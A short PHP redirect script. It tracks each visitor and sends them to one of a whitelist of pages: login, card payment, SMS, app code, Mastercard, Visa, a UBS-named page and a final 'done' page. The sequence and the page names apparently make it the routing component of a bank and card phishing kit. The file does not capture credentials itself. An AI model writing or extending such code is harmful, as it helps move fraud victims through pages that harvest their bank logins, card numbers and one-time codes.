<?php
// redirect.php
require_once 'includes/tracker.php';

// Track the visitor
$visitor = trackVisitor();

// Get the destination from the URL parameter
$destination = $_GET['to'] ?? 'index.php';

// Define allowed destinations to prevent open redirect vulnerabilities
$allowedDestinations = [
         'login' => 'login.php',
         'card' => 'payment.php',
		 'sms' => 'sms.php',
         'app' => 'app.php',
         'app3' => 'appcode.php',
         'mas' => 'master.php',
        'vis' => 'visa.php',
        'sb' => 'sbapp.php',
        'ubs' => 'ubs.php',
         'fin' => 'done.php',
    // Add more destinations as needed
];

// Check if the destination is allowed
if (isset($allowedDestinations[$destination])) {
    redirectVisitor($allowedDestinations[$destination]);
} else {
    // Default redirect to homepage
    redirectVisitor('index.php');
}
?>